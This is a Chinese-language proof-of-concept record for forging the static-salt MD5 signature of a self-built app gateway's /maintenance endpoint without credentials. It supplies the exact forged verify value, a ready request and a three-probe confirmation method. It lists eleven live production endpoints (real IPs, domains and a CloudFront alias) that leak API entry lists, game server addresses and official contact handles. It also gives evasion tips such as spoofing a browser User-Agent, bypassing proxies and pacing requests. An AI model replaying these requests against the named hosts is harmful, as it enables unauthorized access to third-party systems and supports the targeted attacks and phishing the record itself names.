# 自研 App 网关 46750 /maintenance（GetMaintenance 4 字段）预登录签名伪造 → 全量 API 地址表/36610 游戏服/官方联系方式泄露（11 入口含 CDN 别名）

- **code**: 自研-app-网关-46750-maintenance-getmaintenance-4-字段-预登录签名伪造-全
- **kind**: poc
- **category**: info-leak
- **component**: 自研 App 后端网关（IIS+.NET JSON，POST /maintenance，盐 private_maintenance）
- **versions**: 客户端 1.0.0.9（agents 版本）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-05 本机 python requests(trust_env=False) 直连、间隔 6.3s、只读 45 发。（a）预检：sorted("channelvip_1","userid0","version0.0.0.0")+"private_maintenance" → MD5 大写 9A0BEE24A692E5B5E3EE3C12F69EBCDA，脚本内 match=True。（b）9/9 入口在同一 4 字段正确 verify 下全部返回 HTTP 200 / 3469B / ret=0 / sha16=7E24C11C45283013：47.100.166.127:46750(0.27s)、43.139.167.210:46750(0.25s)、34.92.112.63:46750(0.27s)、23.224.93.244:46750(1.08s)、cbob.evuzp9.com:46750(0.37s)、110.41.227.204:46750(0.36s)、nazu.klwfqk.com:46750(0.52s)、uips.pmcqef.com:46750(0.5s 级)、1fy6.h34zsd.cc:443(CNAME d17z5ekcbcfmzh.cloudfront.net, 0.33s)；data 与既有产物 maint_46750_full.json 逐字节一致（accessurl 15 条、accessregionurl 15 条、servers 11 台 :36610、agents 4 条）。（c）对照：全部主机 POST /maintenance 错误 verify → 200/39B/{"ret":1,"msg":"参数检查失败！"}/sha16=28C525732CCC2EFD，证明命中来自签名通过而非宽松解析；未映射 GET /soyajjlwkhzz 分别回 IP 直连 RemoteDisconnected 0.1s / GCP LB 403+134B / awselb 403+520B / CloudFront 502+932B，说明各入口均为已注册路由。前序条目 543 已验证 47.242.109.76:46750 与 139.95.8.48:46750 同型同 sha16，本条把影响面扩到 11 处入口。
- **path**: pocs/自研-app-网关-46750-maintenance-getmaintenance-4-字段-预登录签名伪造-全/poc.md
- **tags**: 46750,maintenance,private_maintenance,GetMaintenance,verify伪造,未授权,info-leak,accessurl,36610,cloudfront,CDN别名,签名静态盐
- **created_at**: 2026-11-04T19:54:27.292Z
- **engine**: https://47.100.166.127:46750（同型 9 入口：43.139.167.210 / 34.92.112.63 / 23.224.93.244 / cbob.evuzp9.com / 110.41.227.204 / nazu.klwfqk.com / uips.pmcqef.com 的 :46750 + 1fy6.h34zsd.cc:443 CloudFront 别名）

## 描述

同族 46750 网关的 /maintenance 有两个不同处理器：47000 吃 7 字段 GetServerInfoByheadUrl，46750 吃 4 字段 GetMaintenance（version/userid/channel + verify）。verify 仅由客户端可读的静态盐 private_maintenance 与参与字段决定，离线可复算，因此无需账号/会话即可拿到全量运营配置；同一套配置在 11 处入口（8 台 :46750 + 1 台 46712 系域名 + 1 个 CloudFront 别名）上完全一致，说明签名层不构成访问控制、且入口以 CDN 形态同样可达。

## 用法

```
1) 打点：POST https://<46750 或 CDN 别名:443>/maintenance，Content-Type: application/json;charset=utf-8，UA 用真实浏览器，body {"version":"0.0.0.0","userid":0,"channel":"vip_1","verify":"9A0BEE24A692E5B5E3EE3C12F69EBCDA"}。verify = UPPER(MD5(按键名升序裸拼 key+value + "private_maintenance"))，preimage=channelvip_1userid0version0.0.0.0private_maintenance，换 userid 必须重算。
2) 三发定型（缺一不可）：① 已注册路由基线 POST /notices 配错误 verify → 200/39B/ret=1/sha16=28C525732CCC2EFD；② 未映射基线 GET /<随机串>（IP 直连可能 RemoteDisconnected，前置 LB 则为 403/502 且体积极小）；③ 命中 = POST /maintenance 4 字段正确 verify → 200/3469B/ret=0/sha16=7E24C11C45283013，data 含 accessurl/accessregionurl/servers/agents/wxservice。
3) 判据：ret=0 + 3469B + 上述 sha16 三条同时满足才算命中；只出现 39B ret=1 说明盐字面量或字段集不对（46750 恒不吃 7 字段，47000 恒不吃 4 字段）。
4) 环境：IP 字面量必须直连（requests trust_env=False / curl --noproxy '*'），否则平台代理 TLS 建链失败 rc=35；HTTPS 自签加 -k / verify=False；固定出口 IP、单发不重放、间隔 ≥5–6s。
5) 影响面枚举：命中后直接读 data.accessurl（15 条，type 0=46750 主入口 / type 2=46712 旧入口与域名入口），对同类主机逐个重放同一包即可确认是否共用同一份配置（sha16 相同）。
```

## 正文

```
## 目标
自研 App 后端生产网关的 `/maintenance`（GetMaintenance 处理器），46750 端口分组；同一配置还以 CloudFront 别名形态在 443 暴露。无需任何账号/凭据/Cookie/会话。

## 请求（无需任何凭据）
```
POST /maintenance HTTP/1.1
Host: 47.100.166.127:46750
Content-Type: application/json;charset=utf-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36

{"version":"0.0.0.0","userid":0,"channel":"vip_1","verify":"9A0BEE24A692E5B5E3EE3C12F69EBCDA"}
```

## verify 算法（客户端静态，可离线复算）
- preimage = 按键名升序把 `key+value` 裸拼 + 静态盐 `private_maintenance`
- 本请求 preimage = `channelvip_1userid0version0.0.0.0private_maintenance`
- verify = UPPER(MD5(preimage)) = `9A0BEE24A692E5B5E3EE3C12F69EBCDA`
- 换 userid 必须重算（userid 参与签名）。未登录时客户端 PlayerPrefs.USERID 缺省 = 0。
- channel 取客户端渠道配置里的字面量，当前只有一个可用值。

## 响应（200 / 3469B / sha16=7E24C11C45283013，全部入口逐字节相同）
```json
{"ret":0,"data":{
 "maintenance":0,"notice":"...",
 "agents":[{"agent":"1","version":"1.0.0.9","download":"https://download.<厂商域>/"}, ...x4],
 "accessurl":{"https://<46750 主入口>":0, ... 共 15 条，type 0=46750 / type 2=46712 旧网关与域名入口},
 "accessregionurl":[{"url":"...","type":0,"weight":99,"area":"GL|HK|CN|MY|US"} x15],
 "servers":[{"id":1,"type":1,"weight":99,"ip":"0.0.0.0","port":26710,"domain":"...:36610","area":"GL","comment":"..."} ... 共 11 台 36610],
 "wxservice":"Telegram : @<官方句柄>","wxservicealert":"<官方句柄>"
}}
```

## 影响面：9 处入口同型同 sha16（2026-11-05 逐台定型，间隔 6.3s，只读）
| # | 入口 | 命中响应 | 备注 |
|---|---|---|---|
| 1 | 47.100.166.127:46750 | 200/3469B/ret=0/7E24C11C45283013（0.27s） | 未映射 GET → RemoteDisconnected 0.1s |
| 2 | 43.139.167.210:46750 | 同上（0.25s） | |
| 3 | 34.92.112.63:46750 | 同上（0.27s） | |
| 4 | 23.224.93.244:46750 | 同上（1.08s） | |
| 5 | cbob.evuzp9.com:46750 | 同上（0.37s） | 未映射 GET → GCP LB 403/134B |
| 6 | 110.41.227.204:46750 | 同上（0.36s） | |
| 7 | nazu.klwfqk.com:46750 | 同上（0.52s） | 未映射 GET → awselb/2.0 403/520B |
| 8 | uips.pmcqef.com:46750 | 同上（0.5s 级） | |
| 9 | 1fy6.h34zsd.cc:443 | 同上（0.33s） | CNAME d17z5ekcbcfmzh.cloudfront.net；未映射 GET → CloudFront 502/932B，**该别名并非断链** |

> 前序实测另有两处同型：47.242.109.76:46750、139.95.8.48:46750（同 sha16）。合计 11 处入口指向同一份运营配置。
> 返回的 data 与本地留存产物逐字节一致（sha16 相同，3469B）：accessurl 15 条、accessregionurl 15 条（area/weight）、servers 11 台 :36610、agents 4 条、官方 Telegram 句柄。

## 三发定型法（判据必须成套，否则易假阳性/假阴性）
| 探针 | 期望回显 | 结论 |
|---|---|---|
| ① 已注册路由基线：`POST /notices` + 错误 verify | 200 / 39B / `{"ret":1,"msg":"参数检查失败！"}` / sha16=28C525732CCC2EFD | 路由存在，签名门生效 |
| ② 未映射基线：`GET /<随机串>` | IP 直连 RemoteDisconnected 0.1s；前置 LB 则 GCP 403/134B、awselb 403/520B、CloudFront 502/932B | 该路径确实未注册 |
| ③ 命中：`POST /maintenance` 4 字段正确 verify | 200 / 3469B / ret=0 / sha16=7E24C11C45283013 | 签名通过，返回全量配置 |

- **命中来自签名通过，不是宽松解析**：③ 的 ret=0 与 ① 的 ret=1 在同一主机上只差 verify，且 ① 的 39B 体在各主机逐字节一致。
- **证伪条件**：任一主机在 4 字段正确 verify 下回 39B ret=1 或 sha16 不同，即该主机不属于本族（可能只是同名端口/同厂商不同集群）。

## 常见失败原因
| 现象 | 结论 |
|---|---|
| 200 / 39B / sha16=28C525732CCC2EFD / ret=1 | 参数或签名校验失败——先查盐字面量，再查字段集是否打错处理器 |
| 7 字段正确 verify 在 46750 回 ret=1 | 正常：7 字段 GetServerInfoByheadUrl 只在 47000；4 字段在 47000 也恒回 ret=1 |
| POST 未映射路径 READ timeout ≥5s 或 RemoteDisconnected | 本网关无 404，用「秒回 ret=1」判已注册路由 |
| curl 默认 UA 被 403 `TEST-ERROR` | 必须伪装浏览器 UA |
| IP 字面量走平台代理 TLS 建链失败 rc=35 | 必须 `--noproxy '*'` / `requests(trust_env=False)` |
| 命中但内容与既有产物不同 | 可能打到了另一套集群，按 sha16 区分并单独记录 |

## 操作纪律
固定出口 IP、单发不重放、间隔 ≥5–6s、全程只读（本轮 45 发 / 6.3s 间隔）。

## 影响
无凭据拿到全部生产 API 入口（含 46712 旧网关与域名级入口）、11 台实时游戏服地址与区域权重、客户端下载源与官方联系方式，可支撑定向攻击与钓鱼；同一份配置横跨 11 处入口（含 CDN 别名）说明该签名机制不构成访问控制，封禁单台/单域无效，须按 accessurl 全量收敛。
```
